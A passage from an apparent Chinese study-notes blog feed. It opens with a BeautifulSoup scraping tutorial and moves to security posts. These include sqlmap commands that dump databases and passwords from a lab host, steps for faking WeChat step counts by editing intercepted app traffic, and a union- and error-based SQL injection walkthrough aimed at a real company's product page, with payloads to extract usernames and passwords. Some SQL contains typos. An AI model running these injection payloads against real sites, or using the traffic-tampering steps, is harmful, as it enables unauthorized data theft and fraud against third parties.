class="string">"D://demo.html"</span>,<span class="string">"html.parser"</span>)<span class="comment">#通过打开文件的方式</span></span><br></pre></td></tr></table></figure><p>BeautifulSoup对应一个HTML/XML文档的全部内容</p><h4 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h4><table><thead><tr><th>解析器</th><th>使用方法</th><th>条件</th></tr></thead><tbody><tr><td>bs4的HTML解析器</td><td>BeautifulSoup(mk,’html.parser’)</td><td>安装bs4库</td></tr><tr><td>lxml的HTML解析器</td><td>BeautifulSoup(mk,’lxml’)</td><td>pip install lxml</td></tr><tr><td>lxml的XML解析器</td><td>BeautifulSoup(mk,’xml’)</td><td>pip install lxml</td></tr><tr><td>html5lib的解析器</td><td>BeautifulSoup(mk,’html5lib’)</td><td>pip install html5lib</td></tr></tbody></table><h4 id="Beautiful-Soup类的基本元素"><a href="#Beautiful-Soup类的基本元素" class="headerlink" title="Beautiful Soup类的基本元素"></a>Beautiful Soup类的基本元素</h4><table><thead><tr><th>基本元素</th><th>说明</th></tr></thead><tbody><tr><td>Tag</td><td>标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾</td></tr><tr><td>Name</td><td>标签名字，&lt; p &gt;…&lt; /p &gt;的名字是‘p’，格式：&lt; tag &gt;.name</td></tr><tr><td>Attributes</td><td>标签的属性，字典形式组织，格式：&lt; tag &gt;.attrs</td></tr><tr><td>NavigebleString</td><td>标签内非属性字符串，&lt;&gt;…&lt;/&gt;中字符串，格式：&lt; tag &gt;.string</td></tr><tr><td>Comment</td><td>标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table><h3 id="基于bs4库的HTML内容遍历方法"><a href="#基于bs4库的HTML内容遍历方法" class="headerlink" title="基于bs4库的HTML内容遍历方法"></a>基于bs4库的HTML内容遍历方法</h3><h4 id="标签树的下行遍历"><a href="#标签树的下行遍历" class="headerlink" title="标签树的下行遍历"></a>标签树的下行遍历</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.contents</td><td>子节点的列表，将&lt; tag &gt;所有<strong>儿子节点存入列表</strong></td></tr><tr><td>.children</td><td>子节点的迭代类型，与.contents类似，用于<strong>循环遍历儿子节点</strong></td></tr><tr><td>.descendants</td><td>子孙节点的迭代类型，包含所有<strong>子孙节点，用于循环遍历</strong></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span class="line">print(child)<span class="comment">#遍历body标签儿子节点</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.descendants:</span><br><span class="line">    print(child)<span class="comment">#遍历子孙节点</span></span><br></pre></td></tr></table></figure><h4 id="标签树的上行遍历"><a href="#标签树的上行遍历" class="headerlink" title="标签树的上行遍历"></a>标签树的上行遍历</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.parent</td><td>节点的<strong>父亲标签</strong></td></tr><tr><td>.parents</td><td>节点先辈标签的迭代类型，<strong>用于循环遍历先辈节点</strong></td></tr></tbody></table><p><strong>打印soup的a标签的所有先辈：</strong></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580896090674.png"  alt="1580896090674"></p><h4 id="标签树的平行遍历"><a href="#标签树的平行遍历" class="headerlink" title="标签树的平行遍历"></a>标签树的平行遍历</h4><p><strong>平行遍历发生在同一个父节点下的各节点间</strong></p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.next_sibling</td><td>返回按照HTML文本顺序的<strong>下一个平行节点标签</strong></td></tr><tr><td>.previous_sibling</td><td>返回按照HTML文本顺序的<strong>上一个平行节点的标签</strong></td></tr><tr><td>.net_sibling</td><td>迭代类型，返回按照HTML文本顺序的<strong>后续所有平行节点标签</strong></td></tr><tr><td>.previous_sibling</td><td>迭代类型，返回按照HTML文本顺序的<strong>前续所有平行节点标签</strong></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_siblings:</span><br><span class="line">    print(sibling)<span class="comment">#遍历后续平行节点</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_sibling:</span><br><span class="line">print(sibling)<span class="comment">#遍历前续平行节点</span></span><br></pre></td></tr></table></figure><h3 id="基于bs4库的HTML格式化和编码"><a href="#基于bs4库的HTML格式化和编码" class="headerlink" title="基于bs4库的HTML格式化和编码"></a>基于bs4库的HTML格式化和编码</h3><h4 id="prettify-方法"><a href="#prettify-方法" class="headerlink" title="prettify()方法"></a>prettify()方法</h4><p><strong>.prettify()方法在每个标签后面加了个换行符/n</strong> </p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580897477605.png"  alt="1580897477605"></p><h3 id="基于bs4库的HTML内容查找方法"><a href="#基于bs4库的HTML内容查找方法" class="headerlink" title="基于bs4库的HTML内容查找方法"></a>基于bs4库的HTML内容查找方法</h3><h4 id="find-all-name-attrs-recursive-string-kwargs"><a href="#find-all-name-attrs-recursive-string-kwargs" class="headerlink" title=".find_all(name, attrs, recursive, string, **kwargs)"></a><strong>.find_all(name, attrs, recursive, string, **</strong>kwargs)</h4><p>返回一个列表类型，存储查找的结果</p><ul><li>name：<strong>对标签名称的检索字符串</strong></li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903655700.png"  alt="1580903655700"></p><ul><li>attres：<strong>对标签属性值的检索字符串</strong>，可标注属性检索</li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903818840.png"  alt="1580903818840"></p><ul><li>recursive：<strong>是否对子孙全部检索</strong>，默认True</li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580903958598.png"  alt="1580903958598"></p><ul><li>string：&lt;&gt;…&lt;/&gt;中字符串区域的检索字符串</li></ul><p>​    <img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1580904150761.png"  alt="1580904150761"></p><h4 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h4><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>&lt;&gt;.find()</td><td>搜索且<strong>只返回一个结果，字符串类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_parents()</td><td>在<strong>先辈节点搜索，返回列表类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_parent()</td><td>在<strong>先辈节点返回一个结果，字符串类型</strong>，同.find()参数</td></tr><tr><td>&lt;&gt;.find()_next_siblings()</td><td>在<strong>后续平行节点中搜索，返回列表类型</strong>，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find()_next_sibling()</td><td>在<strong>后续平行节点中返回一个结果，字符串类型</strong>，同.find()参数</td></tr><tr><td>&lt;&gt;.find()_previous_siblings()</td><td>在<strong>前序平行节点中搜素，返回列表类型</strong>，同.find()_all参数</td></tr><tr><td>&lt;&gt;.find()_previous_sibling()</td><td>在<strong>前序平行节点中返回一个结果，字符串类型</strong>，同.find()参数</td></tr></tbody></table><h3 id="实例：“中国大学排名定向爬虫”"><a href="#实例：“中国大学排名定向爬虫”" class="headerlink" title="实例：“中国大学排名定向爬虫”"></a>实例：“中国大学排名定向爬虫”</h3><p>中国大学排名：</p><p><a href="http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html" target="_blank" rel="noopener">http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html</a></p><p><strong>功能描述</strong></p><ul><li>输入：大学排名URL链接</li><li>输出：大学排名信息的屏幕输出（排名，大学名称，总分）</li><li>技术路线：requests-bs4</li><li>定向爬虫：仅对输入URL进行爬取，不扩展爬取</li></ul><p><strong>程序的结构设计</strong></p><ul><li>步骤1：从网络上获取大学排名网页内容 getHTMLText()</li><li>步骤2：提取网页内容中信息到合适的数据结构 fillUnivList()</li><li>步骤3：利用数据结构展示并输出结果 printUnivList()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.get(url, timeout = <span class="number">30</span>)</span><br><span class="line">r.raise_for_status()</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line"><span class="keyword">return</span> r.text</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:<span class="comment">#find查找tbody标签，children循环遍历儿子节点</span></span><br><span class="line"><span class="keyword">if</span> isinstance(tr,bs4.element.Tag):<span class="comment">#判断tr是否是类bs4.element.Tag的对象</span></span><br><span class="line">tds  = tr(<span class="string">'td'</span>)</span><br><span class="line">ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">2</span>].string])<span class="comment">#.string：&lt;&gt;...&lt;/&gt;中字符串区域的检索字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">tplt = <span class="string">"&#123;0:^10&#125;\t&#123;1:&#123;3&#125;^10&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>,chr(<span class="number">12288</span>)))<span class="comment">#chr(12288)中文空格填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">u=ulist[i]</span><br><span class="line">print(tplt.format(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>],chr(<span class="number">12288</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">unifo = []</span><br><span class="line">url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'</span></span><br><span class="line">html = getHTMLText(url)</span><br><span class="line">fillUnivList(unifo, html)</span><br><span class="line">printUnivList(unifo, <span class="number">20</span>)<span class="comment">#20 univs</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap自动化注入</title>
      <link href="/2020/04/27/sqlmap/"/>
      <url>/2020/04/27/sqlmap/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap自动化注入"><a href="#sqlmap自动化注入" class="headerlink" title="sqlmap自动化注入"></a>sqlmap自动化注入</h2><p>–batch：中间避免手动输入y来确认，自动化完成</p><p>–users:    所有用户</p><p>–current-user：当前用户</p><p>–dbs：所有数据库</p><p>–current-db：当前数据库</p><p>-D “database_name” –tables：查看当前数据库的表</p><p>-D “database_name” -T “table_name” –columns：查看当前数据库的数据表的列</p><p>–dump-all：存储所有数据库</p><p>–dump-all –exclude-sysdbs：存储除系统库外的所有数据库</p><p>-D ”database_name“ -T “table_name” –dump：存储当前数据库的数据表</p><p>-D ”database_name“ -T “table_name” -C “username,password” –dump：存储当前数据的数据表的列的用户名和密码</p><p>-g</p><p>-hh</p><p>-u：url的缩写代表测试后面的网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1   查看页面有没有注入点</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dbs   爆出所有数据库</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --current-db --current-use</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --tables -D security   爆security数据库的表</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --columns -T users -D security  爆security数据库的users的表里面的列</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.10.20.129&#x2F;sqli&#x2F;less-1&#x2F;index.php?id&#x3D;1 --dump -C password,username -T users -D security</span><br><span class="line">  爆security数据库的users的表里面的列的password,username数据信息</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信运动步数修改</title>
      <link href="/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/"/>
      <url>/2020/04/27/%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E6%AD%A5%E6%95%B0%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="微信运动步数修改"><a href="#微信运动步数修改" class="headerlink" title="微信运动步数修改"></a>微信运动步数修改</h1><p>第一步：下载乐心健康app</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement1.jpg"  alt="Wechatm_ovement1"></p><p>第二步：注册登陆账号</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement2.jpg"  alt="Wechatm_ovement2"></p><p>第三歩：同步第三方数据（同步微信和支付宝的数据）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement3.jpg"  alt="Wechatm_ovement3"></p><p>第四步：设置手机代理与抓包工具的代理相同</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement4.jpg"  alt="Wechatm_ovement4"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement5.jpg"  alt="Wechatm_ovement5"></p><p>第六步：开启抓包工具，点击乐心健康app（随便点击），观察抓取数据信息。摇晃手机，观察抓去数据是否有步数更新的信息，然后到repeater中修改步数信息。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Wechatm_ovement6.jpg"  alt="Wechatm_ovement6"></p>]]></content>
      
      
      <categories>
          
          <category> 微信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信运动步数修改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联合查询注入以及报错注入</title>
      <link href="/2020/04/27/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/04/27/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a><strong>联合查询注入</strong></h1><h2 id="联合查询union"><a href="#联合查询union" class="headerlink" title="联合查询union"></a>联合查询union</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,password from mysql.user;//查询mysql.user表中的user，password字段</span><br><span class="line">mysql&gt; select user_login,user_pass from wordpress.wp_user;//查询wordpress.wp_user表中的user_login和user_pass字段</span><br><span class="line"></span><br><span class="line"><span class="comment">#联合查询</span></span><br><span class="line">mysql&gt; select user,password from mysql.user union select user_login,user_pass from wordpress.wp_user;</span><br><span class="line">注意：union查询前后字段数必须相同</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">前面的字段写死如何使后面字段成立</span><br><span class="line">mysql&gt; select * from dvwa.users</span><br><span class="line">-&gt; union</span><br><span class="line">-&gt; select user_login,user_pass from wordpress.wp_user;</span><br><span class="line">ERROR 1222 (2100): The used <span class="keyword">SELECT</span> statements have a different <span class="built_in">number</span> <span class="keyword">of</span> <span class="keyword">columns</span></span><br><span class="line"></span><br><span class="line">方法：猜字段数,直到不在出现出错误提示</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> dvwa.users <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2;</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2,3;</span><br><span class="line">...</span><br><span class="line">mysql&gt; select * from dvwa.users union select 1,2,3,4,5,6;</span><br><span class="line"></span><br><span class="line"><span class="comment">#联合查询</span></span><br><span class="line">mysql&gt; select * from dvwa.users union select user_login,user_pass,1,2,3,4 from wordpress.wp_user;</span><br></pre></td></tr></table></figure><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p>information_schema数据库保存所以数据库信息是<strong>数据库字典</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">==== 查询数据库库名、表名 information_schema.tables ====</span><br><span class="line">mysql&gt; select *form information_schema.TABLES\G//查询来自 TABLES 表的所有信息</span><br><span class="line">mysql&gt; select DISTINCT TABEL_SCHEMA from information_schema.tables;//等价于show databases，DISTINCT 表示对后面的所有参数的拼接取不重复的记录，相当于把 SELECT 表达式的项拼接起来选唯一值。</span><br><span class="line">mysql&gt; select TALE_SHCHEMA,TABLE_NAME from information_schema.TABLES\G;</span><br><span class="line">mysql&gt; select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G;//group_concat()将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</span><br><span class="line">mysql&gt; select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='dvwa';//等价于show tables，查询库名为dvwa来自information_schema数据库中的TABLES表中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==== 查询数据库库名、表名、字段名 information_schema.columns ====</span><br><span class="line">mysql&gt; select *form information_schema.columns\G//查询列的所有信息</span><br><span class="line">mysql&gt; select column_name from information_schema.columns;//查询列的名字</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_schema='dvwa' and table_name='users';//查询dvwa数据库中users表中 列的名字</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_name='USER_PRIVILEGES'//查询用户的权限表</span><br><span class="line">mysql&gt; select column_name from information_schema.columns where table_name='SCHEMA_PRIVILEGES'//查询SCHEMA的权限表</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><code>id=1&#39;  and sleep(5) --+</code></p><h2 id="联合注入流程"><a href="#联合注入流程" class="headerlink" title="联合注入流程"></a>联合注入流程</h2><p>一、找页面可能存在的注入点的位置**</p><ol><li><p>看页面URL地址是否有后台传参动作</p></li><li><p>构造传参值</p><p>?id=52’（注意所有输入必须是英文输入法）</p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>and    1=1    判断页面是否正常</p><p>and    1=2    判断页面是否部分报错</p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>order by（值）找到报错和不报错的邻接点，取不报错的最大值</p><p>（9报错8不报错，证明当前页面有8个显示位）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235574212.png"  alt="1581235574212"></p></li><li><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>union select 1,2,3,4,5,6,7,8 –+ （–+指注释掉我们插入攻击语句后所有代码）（匹配order by验证出来的列数）</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235846419.png"  alt="1581235846419"></p></li><li><p>可以判断当前URL地址为注入点</p><p>在占位符的位置上，构造我们想要的攻击代码。</p><p><a href="http://www.nippon-paint.com.tw/product.php?id=-50" target="_blank" rel="noopener">http://www.nippon-paint.com.tw/product.php?id=-50</a></p><p>union select 1,2,3,4,5,6,构造攻击语句,8 –+</p><p>database()    查看当前页面使用的数据库</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581235983929.png"  alt="1581235983929"></p><p>user()    查看当前登录数据库的用户</p><p>@@version    查看当前数据库版本</p><p>@@basedir    查看路径</p></li><li><p>爆库 查看当前数据库中有哪些数据表</p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=0xsecurity</code></p><p>#注意：group_concat()是将返回的数据当做一行输出，security的十六进制7365637572697479</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236203290.png"  alt="1581236203290"></p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236228119.png"  alt="1581236228119"></p></li><li><p>爆表 查看当前数据报哪个看起来像存放关键信息，查看当前表列</p><p><code>select group_concat(column_name) from information_schema.columns where table_schema=0xsecurity and table_name=0xusers</code></p><p>#注意：users的十六进制7573657273</p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236437856.png"  alt="1581236437856"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236461442.png"  alt="1581236461442"></p></li><li><p>爆数据 ID USER PWD等</p><p><code>select group_concat(concat(username,&#39;%20&#39;,password)) from users</code>    %20~%25 url编码</p></li></ol><p>‘    ‘     LIMIT 0,1    ‘ </p><p> ‘      ‘    –  LIMIT 0,1    ‘</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581236540024.png"  alt="1581236540024"></p><p><img src="/" class="lazyload" data-src="C:%5CUsers%5CShinelon%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581236559664.png"  alt="1581236559664"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="group-by-重复键冲突"><a href="#group-by-重复键冲突" class="headerlink" title="group by 重复键冲突"></a>group by 重复键冲突</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span>查询的内容 <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">version</span>() <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><h2 id="extractvalue（）-函数"><a href="#extractvalue（）-函数" class="headerlink" title="extractvalue（） 函数"></a>extractvalue（） 函数</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and extractvalue(1,concat('^',(查询内容)，'^'))]</span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1' and extractvalue(1,concat('^',(<span class="keyword">select</span> varsion())，<span class="string">'^'</span>)) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><h2 id="updatexml（）函数"><a href="#updatexml（）函数" class="headerlink" title="updatexml（）函数"></a>updatexml（）函数</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and updatexml(1,concat('^',(查询的内容),'^'),1)]</span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1’ and updatexml(1,concat('^',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'^'</span>),<span class="number">1</span>) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp中间人攻击</title>
      <link href="/2020/04/27/arp%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2020/04/27/arp%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
